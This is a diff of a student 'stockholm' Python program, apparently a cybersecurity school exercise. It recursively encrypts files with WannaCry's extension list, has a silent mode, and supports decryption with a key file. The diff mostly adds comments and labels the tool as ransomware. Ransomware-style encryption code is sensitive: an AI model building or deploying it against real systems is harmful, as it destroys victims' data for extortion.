@@ -6,7 +6,7 @@
 #    By: alexsanc <alexsanc@student.42barcel>       +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2023/05/30 18:01:50 by alexsanc          #+#    #+#              #
-#    Updated: 2023/05/30 18:01:58 by alexsanc         ###   ########.fr        #
+#    Updated: 2023/05/31 15:09:35 by alexsanc         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -17,7 +17,12 @@ try:
     from cryptography.fernet import Fernet
     from pathlib import Path
 except:
-    sys.exit("\nError: library")
+    sys.exit("\nError: library not imported")
+
+
+# The function ft_stockholm() is used to call the functions of the program
+# The function takes no arguments
+# The function ft_stockholm() is called in the main function
 
 
 def ft_stockholm():
@@ -29,24 +34,36 @@ def ft_stockholm():
         ft_encode_decode(file)
 
 
+# The function ft_parser() is used to parse the arguments passed to the program
+# The function takes no arguments
+# The function ft_parser() is called in the function ft_stockholm()
+
+
 def ft_parser():
     global args
     parser = argparse.ArgumentParser(
-        description="This program encrypts and decrypts files on the computer.")
+        description="Stockholm is a ransomware that encrypts files and demands a ransom to decrypt them.")
     parser.add_argument(
-        "-v", "--version", help="display the program version", action="store_true")
+        "-v", "--version", help="Display the program version", action="store_true")
     parser.add_argument("-r", "--reverse", metavar=("KEY_FILE", "PATH"), nargs=2,
-                        type=str,  help="decrypt the files using the 'KEY_FILE' in the specified 'PATH'")
+                        type=str,  help="Decrypt files using a key file and a path to decrypt files")
     parser.add_argument(
-        "-s", "--silent", help="enable silent mode", action="store_true")
+        "-s", "--silent", help="Enables silent mode, so that no output is displayed", action="store_true")
     parser.add_argument(
-        "-p", "--path", help="path to encrypt or were encrypted files are located", type=str)
+        "-p", "--path", help="Path to encrypt or were encrypted files are located", type=str)
     args = parser.parse_args()
+
+
+# The function ft_init_vars() is used to initialize the variables
+# The function takes no arguments
+# The function ft_init_vars() is called in the function ft_stockholm()
+# The extensions being encrypted are the same as the ones encrypted by WannaCry
+# The list of extensions is taken from https://www.bleepingcomputer.com/forums/t/648526/extension-list-for-wannacry-ransomware/
 
 
 def ft_init_vars():
     global version, path, path_out, key_file, ext, mode
-    version = "stockholm 1.0.0"
+    version = "stockholm 1.0"
     if args.path:
         path = os.path.join(Path.cwd(), args.path)
     else:
@@ -75,18 +92,28 @@ def ft_init_vars():
                '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
 
 
+# The function ft_check_args() is used to check the arguments passed to the program
+# The function takes no arguments
+# The function ft_check_args() is called in the function ft_stockholm()
+
+
 def ft_check_args():
     if args.version:
         print("version:", version)
         exit()
     if not os.path.exists(path):
-        sys.exit(f"Directory '{path}' doesn't exist")
+        sys.exit(f"The Path specified '{path}' doesn't exist")
     if not os.path.isdir(path):
         sys.exit(f"Can't open '{path}'")
     if args.reverse:
         ft_reverse()
     else:
         ft_normal()
+
+
+# The function ft_reverse() is used to decrypt files
+# The function takes no arguments
+# The function ft_reverse() is called in the function ft_check_args()
 
 
 def ft_reverse():
@@ -99,6 +126,13 @@ def ft_reverse():
     ft_check_path(path_out)
 
 
+# The function ft_check_path() is used to check if the path exists
+# If not, create it
+# If yes, check if it is a folder
+# If yes, continue
+# If not, exit the program
+
+
 def ft_check_path(check):
     if not os.path.exists(check):
         try:
@@ -109,6 +143,11 @@ def ft_check_path(check):
         sys.exit(f'Can\'t open \'{check}\'')
 
 
+# The function ft_normal() is used to generate a key file
+# The function takes no arguments
+# The key file is stored in the current directory and is called decrypt.key
+
+
 def ft_normal():
     global key
     try:
@@ -117,6 +156,15 @@ def ft_normal():
             f.write(key)
     except:
         sys.exit(f"Failed to create '{key_file}'")
+
+
+# The function ft_check_files() is used to check if the files in the path are
+# files or directories, if they are directories, the function calls itself
+# with the new path, if they are files, the function checks if the file has
+# an extension in the list ext, if it has, the function returns the path of
+# the file, if it doesn't have, the function prints the path of the file
+# The function takes one argument, the path to check
+# The function ft_check_files() is called in the function ft_stockholm()
 
 
 def ft_check_files(work_path):
@@ -133,6 +181,11 @@ def ft_check_files(work_path):
                     ft_print(1, full_file)
     except:
         ft_print(4, full_file)
+
+
+# The function ft_encode_decode() is used to encrypt or decrypt files
+# The function takes one argument, the path of the file to encrypt or decrypt
+# The function ft_encode_decode() is called in the function ft_stockholm()
 
 
 def ft_encode_decode(file):
@@ -155,6 +208,12 @@ def ft_encode_decode(file):
         ft_print(3, file)
 
 
+# The function ft_print() is used to print the output of the program
+# The function takes two arguments, the first one is the number of the output
+# The second one is the string to print
+# The function ft_print() is called in the function ft_stockholm()
+
+
 def ft_print(num, string):
     if args.silent:
         return
@@ -164,6 +223,11 @@ def ft_print(num, string):
         print(f'\t{to_print[mode][num]}\t{string}\033[0m')
     else:
         print(f'{to_print[mode][num]}\n\033[0m')
+
+
+# The function main() is used to call the function ft_stockholm()
+# The function takes no arguments
+# The function main() is called when the program is executed
 
 
 if __name__ == "__main__":
